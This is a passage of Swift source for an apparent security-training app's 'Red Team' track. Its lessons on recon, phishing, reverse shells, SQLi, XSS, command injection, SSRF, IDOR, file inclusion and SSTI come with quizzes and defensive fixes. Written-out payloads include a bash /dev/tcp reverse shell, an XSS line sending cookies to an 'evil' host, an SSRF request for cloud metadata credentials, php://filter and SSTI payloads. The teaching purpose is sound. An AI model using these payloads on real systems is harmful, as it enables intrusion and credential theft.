import Foundation

/// The Red Team track — the offensive kill-chain end to end, following the same
/// arc professional certifications drill: recon, access, web, post-exploitation,
/// Active Directory, and advanced exploitation/C2. Every technique here is for
/// authorized testing only.
enum RedTeamContent {

    static let track = Track(
        id: "red-team",
        kind: .redTeam,
        title: "Red Team",
        tagline: "Think like the adversary — recon to root, the offensive way.",
        modules: [recon, access, web, post, activeDirectory, evasion, wireless, advanced]
    )

    // MARK: R1 — Reconnaissance

    private static let recon = Module(
        id: "red-recon",
        title: "Reconnaissance",
        summary: "Map the target before you touch it — open-source intelligence, then active scanning and service enumeration.",
        systemImage: "binoculars.fill",
        lessons: [osintLesson, scanningLesson]
    )

    private static let osintLesson = Lesson(
        id: "red-osint",
        title: "Passive Recon & OSINT",
        subtitle: "Learn everything about a target without sending it a single packet.",
        minutes: 9,
        difficulty: .foundational,
        blocks: [
            .heading("The quietest phase is the most valuable"),
            .paragraph("Passive reconnaissance gathers intelligence from public sources without touching the target's systems — so there's nothing to detect. You're mining DNS records, certificate transparency logs, job postings, LinkedIn, GitHub, and breach dumps to build a map: domains, subdomains, employee names, email formats, and the technologies in use."),
            .terminal(prompt: "kali@lab",
                      command: "whois example.com; theHarvester -d example.com -b all",
                      output: """
[*] Emails found:
  j.doe@example.com
  admin@example.com
[*] Hosts found:
  vpn.example.com
  mail.example.com
  dev-jenkins.example.com   <-- internal tooling exposed?
"""),
            .keyPoints([
                "DNS & subdomains — dig, dnsrecon, crt.sh certificate logs, amass.",
                "People — LinkedIn for names/roles → predict the email format (first.last@).",
                "Code — GitHub for leaked keys, internal hostnames, hard-coded secrets.",
                "Breaches — has this email/password appeared in a public dump? (credential reuse).",
                "Google dorking — site:, filetype:, inurl: to surface forgotten pages."
            ]),
            .callout(.tip, "Email format is gold. If you learn one address is j.doe@corp.com, you've learned the pattern for the whole company — feeding both phishing target lists and password-spray username lists."),
            .definition(term: "Attack surface", meaning: "The complete set of points where an attacker could try to get in — every domain, exposed service, employee, and third-party integration. Recon's job is to enumerate it fully; the defender's job is to shrink it."),
            .checkpoint(QuizQuestion(
                "Why is passive recon so hard for a blue team to detect?",
                options: [
                    "It uses encryption",
                    "It never sends traffic to the target's own systems",
                    "It only runs at night",
                    "It is always done by insiders"
                ],
                correct: 1,
                why: "Passive recon pulls from third-party/public sources (DNS, certs, social media). The target's systems are never touched, so their logs never see it."))
        ],
        quiz: [
            QuizQuestion(
                "You find `dev-jenkins.example.com` in certificate transparency logs. Why is this valuable?",
                options: [
                    "Jenkins is always offline",
                    "It reveals internal/dev tooling that may be exposed and less hardened",
                    "Certificates can't be faked",
                    "It proves the company uses Java"
                ],
                correct: 1,
                why: "Dev and CI/CD systems like Jenkins are frequently under-secured yet powerful (they build and deploy code). Finding one exposed is a strong lead."),
            QuizQuestion(
                "Learning that one employee's address is `a.khan@corp.com` most directly helps you…",
                options: [
                    "Decrypt their email",
                    "Infer the email format to build username/phishing lists for the whole org",
                    "Log into their account",
                    "Bypass MFA"
                ],
                correct: 1,
                why: "A single confirmed address reveals the naming convention, letting you generate plausible addresses for every employee you find on LinkedIn.")
        ]
    )

    private static let scanningLesson = Lesson(
        id: "red-scanning",
        title: "Active Scanning & Enumeration",
        subtitle: "Find the open doors, then interrogate every service behind them.",
        minutes: 11,
        difficulty: .intermediate,
        blocks: [
            .heading("Scan, then enumerate"),
            .paragraph("Active recon sends packets. First you discover which hosts are up and which ports are open; then you *enumerate* — squeeze every service for its version, configuration, and exposed functionality. Enumeration is where engagements are won. The mantra in offensive training is blunt: **enumerate, enumerate, enumerate.**"),
            .animation(.portScan, caption: "A scanner sweeps a host's ports — watch open, closed and filtered light up, then service-version probes fingerprint what's listening."),
            .terminal(prompt: "kali@lab",
                      command: "nmap -sC -sV -p- 10.10.10.5 -oN full.txt",
                      output: """
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu
80/tcp  open  http     Apache 2.4.18
|_http-title: Acme Intranet
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  microsoft-ds Samba smbd 4.3.11
3306/tcp open mysql    MySQL 5.7.21
"""),
            .keyPoints([
                "-p- scans all 65,535 ports — never trust a fast top-1000 scan alone.",
                "-sV grabs service versions; -sC runs safe default scripts (NSE).",
                "Old versions (OpenSSH 7.2, Apache 2.4.18) → search for known CVEs.",
                "SMB (139/445) → enumerate shares with smbclient/enum4linux.",
                "Always save output (-oN/-oA) — you'll revisit it constantly."
            ]),
            .definition(term: "Banner grabbing", meaning: "Reading the identifying text a service announces on connect (e.g. an SMTP or SSH banner). Versions map directly to known vulnerabilities via CVE databases and searchsploit."),
            .callout(.warning, "A full -p- scan is loud — it lights up IDS/IPS instantly. On a real engagement you balance thoroughness against stealth; in a lab, go loud and complete."),
            .checkpoint(QuizQuestion(
                "Your fast scan found nothing exploitable. What's the most likely mistake?",
                options: [
                    "The target is patched perfectly",
                    "You only scanned the top 1000 ports and missed a service on a high port",
                    "Nmap is broken",
                    "You should give up"
                ],
                correct: 1,
                why: "Services frequently hide on non-standard high ports. The default nmap scan covers only the top 1000. -p- (all ports) routinely reveals the foothold a fast scan missed."))
        ],
        quiz: [
            QuizQuestion(
                "What does `-sV` add to an nmap scan?",
                options: [
                    "It scans UDP",
                    "It fingerprints the version of each service",
                    "It runs a vulnerability exploit",
                    "It hides the scan"
                ],
                correct: 1,
                why: "-sV performs version detection, fingerprinting the software and version behind each open port — the input you feed to CVE/searchsploit lookups."),
            QuizQuestion(
                "You find SMB open on 445. A natural next step is to…",
                options: [
                    "Ignore it; SMB is never useful",
                    "Enumerate shares and users with tools like smbclient or enum4linux",
                    "Reboot the target",
                    "Scan it again with the same flags"
                ],
                correct: 1,
                why: "Open SMB invites enumeration of shares, users and policies (enum4linux, smbclient, crackmapexec) — a classic source of footholds and credentials.")
        ]
    )

    // MARK: R2 — Initial access & exploitation

    private static let access = Module(
        id: "red-access",
        title: "Initial Access & Exploitation",
        summary: "Turn a foothold into a shell — by manipulating people, and by exploiting vulnerable services.",
        systemImage: "key.fill",
        lessons: [phishingLesson, exploitationLesson]
    )

    private static let phishingLesson = Lesson(
        id: "red-phishing",
        title: "Phishing & Social Engineering",
        subtitle: "The human is the most reliable exploit — and the hardest to patch.",
        minutes: 10,
        difficulty: .intermediate,
        blocks: [
            .heading("Why attack people?"),
            .paragraph("You can spend weeks fighting a hardened firewall, or you can email an employee a document they'll happily open. The vast majority of real breaches begin with phishing because it sidesteps technical controls entirely. Social engineering exploits trust, urgency, authority, and fear — not software."),
            .animation(.phishingFlow, caption: "Follow a phishing email from send → click → payload → the attacker's first shell, and see where each control could break it."),
            .keyPoints([
                "Pretext — the believable story (IT password reset, invoice, HR doc).",
                "Lure — the email/SMS/call that delivers it; spoofed or look-alike sender.",
                "Payload — a malicious macro, a credential-harvesting clone site, or an OAuth consent grab.",
                "Pretexting + urgency (“your account locks in 1 hour”) drives clicks.",
                "Spear-phishing targets one person with personalized detail; whaling targets executives."
            ]),
            .callout(.danger, "Credential-harvesting pages are devastatingly effective: a pixel-perfect clone of a login page captures the password, and increasingly relays it in real time to defeat one-time-code MFA (adversary-in-the-middle)."),
            .definition(term: "Phishing-resistant MFA", meaning: "Authentication that can't be relayed by a fake site — FIDO2/WebAuthn hardware keys and passkeys bind the login to the real domain. The single most effective defense against credential phishing."),
            .paragraph("Defensively, this is a layered problem: email filtering and DMARC reduce delivery, user training reduces clicks, and phishing-resistant MFA neutralizes stolen passwords. No single control is enough."),
            .checkpoint(QuizQuestion(
                "An attacker clones your Microsoft 365 login and relays your one-time code instantly. Which defense actually stops this?",
                options: [
                    "A longer password",
                    "SMS one-time codes",
                    "FIDO2/passkey (phishing-resistant) MFA",
                    "Changing your password monthly"
                ],
                correct: 2,
                why: "Adversary-in-the-middle phishing relays passwords AND one-time codes. FIDO2/passkeys are bound to the real domain cryptographically, so a fake site can't complete the login."))
        ],
        quiz: [
            QuizQuestion(
                "Spear-phishing differs from ordinary phishing because it…",
                options: [
                    "Is sent to millions of people",
                    "Is highly targeted and personalized to a specific individual",
                    "Never uses email",
                    "Is always legal"
                ],
                correct: 1,
                why: "Spear-phishing tailors the lure to one target using gathered OSINT, making it far more convincing than spray-and-pray bulk phishing."),
            QuizQuestion(
                "Which psychological lever is an email saying “Your account will be suspended in 30 minutes — verify now” using?",
                options: ["Curiosity", "Urgency", "Reciprocity", "Scarcity of product"],
                correct: 1,
                why: "A countdown manufactures urgency, pushing the target to act before they think critically — a hallmark of effective social engineering.")
        ]
    )

    private static let exploitationLesson = Lesson(
        id: "red-exploitation",
        title: "Exploiting Services & Getting a Shell",
        subtitle: "From a known-vulnerable version to remote code execution and a reverse shell.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("From version to exploit"),
            .paragraph("Enumeration handed you software versions. Now you match them to public exploits, weaponize, and execute. `searchsploit` queries a local copy of Exploit-DB; Metasploit packages many exploits with payloads and handlers. But manual exploitation — reading the code, fixing offsets, swapping shellcode — is the skill that separates operators from button-pushers."),
            .terminal(prompt: "kali@lab",
                      command: "searchsploit vsftpd 2.3.4",
                      output: """
Exploit Title                                  Path
----------------------------------------------  ---------
vsftpd 2.3.4 - Backdoor Command Execution      unix/remote/49757.py
"""),
            .heading("Reverse vs bind shells"),
            .paragraph("Once you can run code, you want an interactive shell. A **bind shell** opens a port on the victim and waits — but firewalls usually block inbound connections. A **reverse shell** makes the victim connect *out* to you, which firewalls happily allow. That's why reverse shells dominate."),
            .terminal(prompt: "kali@lab",
                      command: "nc -lvnp 4444   # attacker listens; victim runs the payload below",
                      output: """
# victim executes:
bash -i >& /dev/tcp/10.10.14.3/4444 0>&1

connect to [10.10.14.3] from (UNKNOWN) [10.10.10.5] 51002
victim$ id
uid=33(www-data) gid=33(www-data)
"""),
            .keyPoints([
                "Match version → CVE → exploit (searchsploit, Exploit-DB, vendor advisories).",
                "Prefer reverse shells: victim → attacker beats blocked inbound ports.",
                "Stabilize a raw shell (PTY upgrade) before doing real work.",
                "You usually land as a low-privilege service account (www-data) — privilege escalation comes next."
            ]),
            .callout(.warning, "Never run an exploit you haven't read on a real engagement. Public PoCs can be unstable, destructive, or backdoored. Understand what it does before you fire it."),
            .checkpoint(QuizQuestion(
                "Why do attackers favor reverse shells over bind shells?",
                options: [
                    "Reverse shells are encrypted by default",
                    "Outbound connections from the victim usually pass through firewalls that block inbound ones",
                    "Bind shells don't give a prompt",
                    "Reverse shells need no listener"
                ],
                correct: 1,
                why: "Perimeter firewalls typically block unsolicited inbound connections but allow outbound. A reverse shell has the victim connect out to the attacker, sliding past that rule."))
        ],
        quiz: [
            QuizQuestion(
                "After exploiting a web service you land as `www-data`. What's the realistic next objective?",
                options: [
                    "You already have full control; stop",
                    "Privilege escalation to root/SYSTEM",
                    "Reboot the box",
                    "Delete the logs and leave"
                ],
                correct: 1,
                why: "Service accounts like www-data are low-privilege. The next phase is privilege escalation to gain root/Administrator and full control of the host."),
            QuizQuestion(
                "What does `searchsploit` query?",
                options: [
                    "Live targets on the internet",
                    "A local database of known exploits (Exploit-DB)",
                    "The Metasploit license server",
                    "Your shell history"
                ],
                correct: 1,
                why: "searchsploit searches a local mirror of Exploit-DB, mapping software/versions to published exploit code.")
        ]
    )

    // MARK: R3 — Web application attacks

    private static let web = Module(
        id: "red-web",
        title: "Web Application Attacks",
        summary: "The internet's biggest attack surface — injecting into queries and browsers, abusing broken access control, reading the server's files, and reaching code execution through templates and deserialization.",
        systemImage: "globe",
        lessons: [sqliLesson, xssLesson, cmdiLesson, accessControlLesson, fileInclusionLesson, webAdvancedLesson]
    )

    private static let sqliLesson = Lesson(
        id: "red-sqli",
        title: "SQL Injection",
        subtitle: "When user input becomes part of the database query, you own the database.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("Mixing code and data"),
            .paragraph("SQL injection happens when an application glues user input directly into a database query. The database can't tell your data from the developer's code, so a carefully crafted input *changes the query's meaning*. The result ranges from bypassing a login to dumping every table in the database."),
            .animation(.sqlInjection, caption: "Watch a login input rewrite the SQL query itself — turning a password check into `OR 1=1` that's always true."),
            .heading("The classic auth bypass"),
            .paragraph("Imagine the server builds: `SELECT * FROM users WHERE user='$u' AND pass='$p'`. Supply a username of `admin'-- ` and the rest of the query is commented out — the password check vanishes."),
            .terminal(prompt: "browser",
                      command: "username:  admin'-- \npassword:  (anything)",
                      output: """
-- resulting query:
SELECT * FROM users WHERE user='admin'-- ' AND pass='x'
-- everything after -- is a comment; password check removed → logged in as admin
"""),
            .keyPoints([
                "' OR '1'='1 — makes the WHERE clause always true.",
                "UNION SELECT — appends attacker-chosen columns to exfiltrate other tables.",
                "Blind SQLi — no visible output, so you infer data via true/false or time delays.",
                "sqlmap automates detection and extraction once you've found an injectable parameter."
            ]),
            .callout(.danger, "The fix is not “filter bad words.” It's **parameterized queries (prepared statements)**, which send code and data on separate channels so input can never be parsed as SQL. Input validation and least-privilege DB accounts are defense in depth on top."),
            .definition(term: "Parameterized query", meaning: "A query where placeholders (?) are bound to values by the driver, never concatenated into the SQL string. The database treats bound values as pure data — structurally immune to injection."),
            .checkpoint(QuizQuestion(
                "What is the correct, complete fix for SQL injection?",
                options: [
                    "Blacklist the word SELECT",
                    "Use parameterized queries / prepared statements",
                    "Hide error messages",
                    "Rename the database"
                ],
                correct: 1,
                why: "Parameterized queries separate code from data so input can't alter query structure. Blacklists are bypassable; hiding errors only slows blind exploitation."))
        ],
        quiz: [
            QuizQuestion(
                "Why does `admin'-- ` often bypass a login?",
                options: [
                    "It guesses the password",
                    "The -- comments out the rest of the query, removing the password check",
                    "It crashes the server",
                    "It encrypts the query"
                ],
                correct: 1,
                why: "In SQL, -- starts a comment. Injecting it after a valid username comments out the AND password=... clause, so authentication passes on the username alone."),
            QuizQuestion(
                "A SQL injection where the page shows no data but responses get slower with `SLEEP(5)` is called…",
                options: ["Union-based", "Error-based", "Blind (time-based) SQLi", "Stored SQLi"],
                correct: 2,
                why: "When there's no direct output, you infer data through observable side effects like response timing — time-based blind SQL injection.")
        ]
    )

    private static let xssLesson = Lesson(
        id: "red-xss",
        title: "Cross-Site Scripting (XSS)",
        subtitle: "Injecting your JavaScript into a page so it runs in someone else's browser.",
        minutes: 10,
        difficulty: .advanced,
        blocks: [
            .heading("Hijacking the trust a browser gives a site"),
            .paragraph("XSS injects attacker-controlled script into a web page so it executes in *victims'* browsers with the site's privileges. Because the browser trusts code from the site's origin, your script can read cookies, capture keystrokes, perform actions as the user, or rewrite the page."),
            .animation(.xssReflected, caption: "A search box reflects unescaped input into the page; the injected <script> runs and exfiltrates the victim's session cookie."),
            .keyPoints([
                "Reflected — payload in a URL/parameter is echoed straight back into the page; needs a click.",
                "Stored — payload is saved (a comment, profile field) and runs for everyone who views it. Most dangerous.",
                "DOM-based — vulnerable client-side JavaScript writes attacker input into the DOM.",
                "Impact: session theft, keylogging, forced actions, drive-by malware, full account takeover."
            ]),
            .terminal(prompt: "browser",
                      command: "https://site/search?q=<script>fetch('//evil/c?'+document.cookie)</script>",
                      output: """
// the site echoes q into the HTML unescaped:
<h2>Results for <script>fetch('//evil/c?'+document.cookie)</script></h2>
// → victim's browser runs it → session cookie sent to attacker
"""),
            .callout(.danger, "If a session cookie lacks the HttpOnly flag, XSS can read it directly and hand the attacker a logged-in session — no password needed."),
            .definition(term: "Output encoding", meaning: "The core XSS defense: encode user data for the context it's rendered in (HTML, attribute, JS, URL) so it's displayed as text, never executed. Pair with a Content-Security-Policy and HttpOnly cookies."),
            .checkpoint(QuizQuestion(
                "Which XSS type fires for every visitor without any of them clicking a crafted link?",
                options: ["Reflected XSS", "Stored XSS", "DOM XSS", "Self-XSS"],
                correct: 1,
                why: "Stored (persistent) XSS is saved server-side and served to everyone who views the affected page, so each visitor is hit automatically — the highest-impact variant."))
        ],
        quiz: [
            QuizQuestion(
                "What does the HttpOnly cookie flag do?",
                options: [
                    "Encrypts the cookie",
                    "Stops JavaScript (and thus XSS) from reading the cookie",
                    "Makes the cookie expire faster",
                    "Forces HTTPS"
                ],
                correct: 1,
                why: "HttpOnly hides the cookie from document.cookie, so script injected via XSS can't read the session token. (The Secure flag, not HttpOnly, forces HTTPS.)"),
            QuizQuestion(
                "The primary server-side defense against XSS is…",
                options: [
                    "Hiding the source code",
                    "Context-aware output encoding of user data",
                    "Using POST instead of GET",
                    "Disabling cookies"
                ],
                correct: 1,
                why: "Encoding user-supplied data for its output context ensures it renders as inert text rather than executable markup/script. CSP is a strong second layer.")
        ]
    )

    // MARK: R4 — Post-exploitation

    private static let cmdiLesson = Lesson(
        id: "red-cmdi",
        title: "Command Injection & SSRF",
        subtitle: "When the server runs your input as a command — or fetches a URL you control.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("Two bugs, one root cause: trusting input"),
            .paragraph("SQL injection put your input inside a *database query*. Two close cousins put your input somewhere even more dangerous. **Command injection** lands it inside a shell command the server runs. **Server-Side Request Forgery (SSRF)** makes the server send a request to a URL you choose. Both come from the same mistake — taking user input and handing it to a powerful function without validation."),
            .heading("Command injection: borrowing the server's shell"),
            .paragraph("Imagine a 'ping this host' tool that builds a command by gluing your input into a string: `ping -c 1 <your input>`. If you supply `8.8.8.8; id`, the shell runs ping *and then* runs `id` — as the web server's user. Shell metacharacters (`;`, `|`, `&&`, backticks, `$()`) are the keys here."),
            .terminal(prompt: "attacker",
                      command: "curl 'http://shop.lab/ping?host=8.8.8.8;id'",
                      output: """
PING 8.8.8.8: 56 data bytes
64 bytes from 8.8.8.8: icmp_seq=0 ttl=117 time=11.4 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)   <-- command ran!
"""),
            .keyPoints([
                "Separators — `;` `&&` `||` chain a second command; `|` pipes into one.",
                "Substitution — `$(cmd)` and backticks run a command and paste its output.",
                "Blind injection — no output returned? Confirm with a time delay (`; sleep 5`) or an out-of-band callback (force a DNS lookup you control).",
                "The goal is usually a reverse shell — turn the single command into interactive access."
            ]),
            .definition(term: "Reverse shell", meaning: "Instead of you connecting to the victim (which a firewall blocks inbound), you make the victim connect *out* to you. A listener on your box (`nc -lvnp 443`) catches it and you get an interactive shell on the target."),
            .heading("SSRF: making the server your proxy"),
            .paragraph("Many apps fetch URLs on your behalf — a webhook tester, a 'preview this link' feature, an avatar-by-URL uploader. If you can control that URL, you can make the server request things *you* can't reach directly: internal admin panels, other services on localhost, and — most dangerously — cloud metadata endpoints that hand out credentials."),
            .terminal(prompt: "attacker",
                      command: "curl 'http://shop.lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
                      output: """
web-app-role
# Then fetch that role:
# .../iam/security-credentials/web-app-role  ->  AWS keys leaked!
"""),
            .callout(.danger, "169.254.169.254 is the cloud metadata service on AWS/GCP/Azure. A classic SSRF makes the server query it and return temporary cloud credentials — turning a 'harmless' URL-preview feature into a full cloud compromise. This exact bug caused the 2019 Capital One breach."),
            .heading("How they're fixed"),
            .keyPoints([
                "Command injection — never build shell strings from input; use parameterized APIs (e.g. `subprocess` with an argument list, no shell). Validate against a strict allowlist.",
                "SSRF — validate and allowlist destination URLs, block private/link-local IP ranges, and require the metadata service to use session tokens (IMDSv2).",
                "Defense in depth — run the web process as an unprivileged user with minimal network egress so a successful injection reaches as little as possible."
            ]),
            .callout(.warning, "Allowlisting by hostname is harder than it looks: attackers bypass naive filters with redirects, DNS rebinding, alternate IP encodings (`0x7f.0.0.1`), and IPv6. Block by resolved IP range, not by string matching the URL."),
            .checkpoint(QuizQuestion(
                "A web form lets you enter a server to 'check uptime' and shows the ping result. You enter `127.0.0.1 && whoami` and see a username in the output. What vulnerability is this?",
                options: [
                    "SQL injection",
                    "Cross-site scripting",
                    "Command injection",
                    "SSRF"
                ],
                correct: 2,
                why: "Your input was concatenated into a shell command, and `&&` let you run a second command (`whoami`) on the server. That's command injection — code execution on the host, not in a database or a browser."))
        ],
        quiz: [
            QuizQuestion(
                "Why is SSRF against a cloud app especially dangerous?",
                options: [
                    "It deletes the database",
                    "It can reach the internal metadata service and steal temporary cloud credentials",
                    "It only affects the attacker's own browser",
                    "It slows the server down"
                ],
                correct: 1,
                why: "SSRF lets the server request internal-only endpoints, including the cloud metadata service (169.254.169.254), which can return IAM credentials — escalating a web bug into cloud account takeover."),
            QuizQuestion(
                "What is the most robust fix for command injection?",
                options: [
                    "Blocking the word 'shell' in input",
                    "Avoiding the shell entirely — call programs with a parameterized argument list and validate input against an allowlist",
                    "Running the server as root so it has fewer errors",
                    "Hiding the error messages"
                ],
                correct: 1,
                why: "Blacklisting characters is brittle. The durable fix is to never pass user input to a shell: invoke the program directly with separate arguments, and constrain input to a strict allowlist."),
            QuizQuestion(
                "An injection returns no output, but adding `; sleep 5` makes the page take five seconds longer. This confirms…",
                options: [
                    "The server is just slow",
                    "A blind command injection — you can't see output, but timing proves your command ran",
                    "An XSS vulnerability",
                    "Nothing useful"
                ],
                correct: 1,
                why: "When there's no visible output, a measurable time delay is proof the injected command executed. This 'blind' technique (also used in blind SQLi) confirms exploitability without needing the result echoed back.")
        ]
    )

    private static let accessControlLesson = Lesson(
        id: "red-access-control",
        title: "Broken Access Control & IDOR",
        subtitle: "The #1 web risk — asking for objects that aren't yours and getting them anyway.",
        minutes: 10,
        difficulty: .intermediate,
        blocks: [
            .heading("Authentication is not authorization"),
            .paragraph("Authentication answers *who are you?*; authorization answers *what are you allowed to do?* Broken access control is when the app checks the first but forgets the second — you're logged in, but the server hands you data and actions that belong to someone else. OWASP ranks it the **#1** web application risk, and it needs no special payload: just a changed value in a request you're allowed to send."),
            .animation(.accessControl, caption: "Logged in as Alice, the attacker changes the invoice id in the URL — and the server returns Bob's record because it never checked ownership."),
            .heading("IDOR: the canonical example"),
            .paragraph("An **Insecure Direct Object Reference** is access control's poster child. The app exposes a database key — `/invoice?id=1042` — and trusts that you'll only ask for your own. Increment the id and you read another user's invoice. The same flaw appears as `/api/users/1043`, hidden form fields, and predictable filenames. It's devastating precisely because it looks like normal use."),
            .terminal(prompt: "browser",
                      command: "GET /api/account/1042/statement   (you're user 1042)\nGET /api/account/1043/statement   (just change the id)",
                      output: """
HTTP/1.1 200 OK
{ \"owner\": \"Bob Reyes\", \"balance\": 9800.00, \"ssn\": \"***-**-1199\" }
# the server returned another customer — no ownership check
"""),
            .keyPoints([
                "Horizontal — reach another user's data at your privilege level (their invoice).",
                "Vertical — reach a higher privilege (hit /admin as a normal user and it just works).",
                "Forced browsing — guess unlinked URLs (/admin, /backup.zip) the UI never shows you.",
                "Mass assignment — add `\"role\":\"admin\"` to a profile-update JSON body and the server binds it.",
                "Hunt by tampering ids, methods (GET→DELETE), and parameters with an intercepting proxy."
            ]),
            .definition(term: "IDOR", meaning: "Insecure Direct Object Reference: the app uses user-supplied input to point at an object (a row, a file) without verifying the requester is allowed that specific object. The fix is a server-side ownership/authorization check on every object access."),
            .callout(.danger, "Access control must be enforced on the server for every request. Hiding the admin button, using long random ids, or checking on the client are not access control — an attacker talks to the API directly."),
            .callout(.tip, "The durable fix: deny by default and check authorization against the *session's* identity on each object — `WHERE id = :id AND owner = :current_user`. Never trust that the client only requests what it's supposed to."),
            .checkpoint(QuizQuestion(
                "As normal user 1042 you change `/api/account/1042/statement` to `/api/account/1043/statement` and receive user 1043's data. What is this?",
                options: [
                    "SQL injection",
                    "An Insecure Direct Object Reference (broken access control)",
                    "Cross-site scripting",
                    "A buffer overflow"
                ],
                correct: 1,
                why: "You requested another user's object by id and the server returned it without an ownership check. That's IDOR — a broken-access-control flaw, not an injection."))
        ],
        quiz: [
            QuizQuestion(
                "What is the difference between authentication and authorization?",
                options: [
                    "They're the same thing",
                    "Authentication proves who you are; authorization decides what you're allowed to do",
                    "Authorization happens first",
                    "Authentication is only for admins"
                ],
                correct: 1,
                why: "Authentication = identity; authorization = permissions. Broken access control is failing the authorization check even when authentication succeeded."),
            QuizQuestion(
                "Why is 'hide the admin link in the UI' not real access control?",
                options: [
                    "It is — users can't see it",
                    "An attacker can request the admin endpoint directly; control must be enforced server-side on every request",
                    "Because admins use a different browser",
                    "Because links are encrypted"
                ],
                correct: 1,
                why: "The UI is just a client. The server must authorize each request against the caller's identity; hiding controls only obscures, it doesn't enforce."),
            QuizQuestion(
                "Adding `\"isAdmin\": true` to a profile-update request and having the server accept it is an example of…",
                options: ["Mass assignment", "A SQL union", "DNS poisoning", "A NOP sled"],
                correct: 0,
                why: "Mass assignment is when the server blindly binds request fields to object properties — letting you set fields (like role) you were never meant to control.")
        ]
    )

    private static let fileInclusionLesson = Lesson(
        id: "red-file-inclusion",
        title: "Path Traversal & File Inclusion",
        subtitle: "When a filename comes from the user, the whole filesystem is in scope — and sometimes code execution.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("User-controlled paths are dangerous"),
            .paragraph("Many apps build a file path from input: `include(\"pages/\" . $_GET['page'])`, a download endpoint, an avatar loader. If you control part of that path and the app doesn't constrain it, you can climb out of the intended directory with `../` sequences and read files anywhere the web process can — config, source, secrets, `/etc/passwd`."),
            .animation(.fileInclusion, caption: "A page parameter is swapped for ../../../../etc/passwd; the server dutifully reads and returns the file it was handed."),
            .heading("Traversal → Local File Inclusion → RCE"),
            .paragraph("**Path traversal** reads files. **Local File Inclusion (LFI)** goes further: the app doesn't just read the file, it *executes* it as part of the page. That opens a path to code execution — poison a file you can write to (a log, an uploaded image, a session file) with PHP, then include it. **Remote File Inclusion (RFI)** is the rarer, worse cousin: the app includes a URL you host, running your code directly."),
            .terminal(prompt: "attacker",
                      command: "curl 'http://shop.lab/index.php?page=php://filter/convert.base64-encode/resource=config'",
                      output: """
PD9waHAgJGRiX3Bhc3M9...     # base64 of config.php source
# decode → $db_pass = 'S3cr3tDB!';  ← source & secrets leaked
"""),
            .keyPoints([
                "../ (dot-dot-slash) climbs out of the intended folder; chain enough to reach the root.",
                "php://filter wrappers leak source code (and its secrets) as base64.",
                "LFI + log poisoning — write PHP into a log/User-Agent the app will later include → RCE.",
                "RFI — the app includes a remote URL you control → direct code execution (needs risky config).",
                "Bypasses: URL-encoding (%2e%2e%2f), null bytes on old PHP, nested ....// against naive filters."
            ]),
            .definition(term: "Local File Inclusion (LFI)", meaning: "A flaw where attacker-controlled input determines which local file the application loads and runs. At minimum it discloses files; combined with a way to plant code (log/upload poisoning) it becomes remote code execution."),
            .callout(.danger, "On a cloud host, file read often beats the box on its own: `/proc/self/environ`, cloud-init data, and SSH keys in predictable paths frequently hand you credentials or a shell directly."),
            .callout(.warning, "The fix is not blocking the string '../'. Attackers bypass naive filters endlessly. Resolve the final canonical path and confirm it stays within an allowed base directory — or, better, never put user input in a path: map an allowlist of ids to fixed filenames."),
            .checkpoint(QuizQuestion(
                "An app uses `?page=home` to pick a template. You request `?page=../../../../etc/passwd` and see the file's contents. What's the most accurate name and risk?",
                options: [
                    "XSS — it could run script",
                    "Path traversal / LFI — arbitrary file read, potentially escalating to code execution",
                    "SQL injection — it reads the database",
                    "CSRF — it forges a request"
                ],
                correct: 1,
                why: "Climbing directories with ../ to read arbitrary files is path traversal; because the app includes the file, it's LFI — which can escalate to RCE via log/upload poisoning."))
        ],
        quiz: [
            QuizQuestion(
                "What does the `../` sequence do in a traversal payload?",
                options: [
                    "Comments out the rest of the path",
                    "Moves up one directory, letting you escape the intended folder",
                    "Encrypts the filename",
                    "Repeats the previous request"
                ],
                correct: 1,
                why: "Each ../ ascends one directory level. Chaining enough of them walks up to the filesystem root, from which you can descend to any readable file."),
            QuizQuestion(
                "How does Local File Inclusion typically escalate from file read to code execution?",
                options: [
                    "It can't — LFI is read-only",
                    "By poisoning a file the app will include (a log, an upload) with code, then including it",
                    "By brute-forcing the password",
                    "By overflowing a buffer"
                ],
                correct: 1,
                why: "If you can write attacker code into a file the vulnerable include later executes (log poisoning, a malicious upload, a session file), LFI turns into RCE."),
            QuizQuestion(
                "What is the robust fix for file-inclusion bugs?",
                options: [
                    "Blocking the literal string '../'",
                    "Map user input to an allowlist of known files, or canonicalize the path and confirm it stays in an allowed directory",
                    "Renaming the files",
                    "Using POST instead of GET"
                ],
                correct: 1,
                why: "Blacklists are bypassable. Resolve the real path and bound it to an allowed base, or avoid user input in paths entirely by mapping ids to fixed filenames.")
        ]
    )

    private static let webAdvancedLesson = Lesson(
        id: "red-web-advanced",
        title: "SSTI, XXE & Insecure Deserialization",
        subtitle: "Three advanced bugs that turn 'just data' into remote code execution on the server.",
        minutes: 13,
        difficulty: .expert,
        blocks: [
            .heading("When the server treats your data as instructions"),
            .paragraph("The advanced web bugs (the heart of OffSec's OSWE) share one theme: data the developer assumed was inert gets *interpreted* by a powerful engine — a template renderer, an XML parser, an object deserializer. Each can collapse straight into remote code execution. You typically find them by source-code review and careful probing, not a noisy scanner."),
            .animation(.templateInjection, caption: "A name field containing {{7*7}} renders as 49 — proof the template engine evaluates input — then a crafted payload reaches os.popen and runs id."),
            .heading("Server-Side Template Injection (SSTI)"),
            .paragraph("Template engines (Jinja2, Twig, Freemarker) build pages by evaluating expressions in `{{ }}`. If user input is concatenated into the template *string* rather than passed as data, your input gets evaluated. The classic probe is `{{7*7}}` — if the page renders `49`, the engine is executing your input, and engine-specific payloads reach the OS from there."),
            .terminal(prompt: "browser",
                      command: "name={{ self.__init__.__globals__.os.popen('id').read() }}",
                      output: """
Hello uid=33(www-data) gid=33(www-data) groups=33(www-data)
# template injection → arbitrary command execution
"""),
            .heading("XXE — XML External Entities"),
            .paragraph("XML parsers can define **entities**, and external entities can point at a URL or a local file. An app that parses user-supplied XML with a default, unhardened parser can be told to inline `/etc/passwd` or reach internal services (SSRF) — sometimes blind, exfiltrating over an out-of-band channel."),
            .code(language: "xml", """
<?xml version="1.0"?>
<!DOCTYPE r [
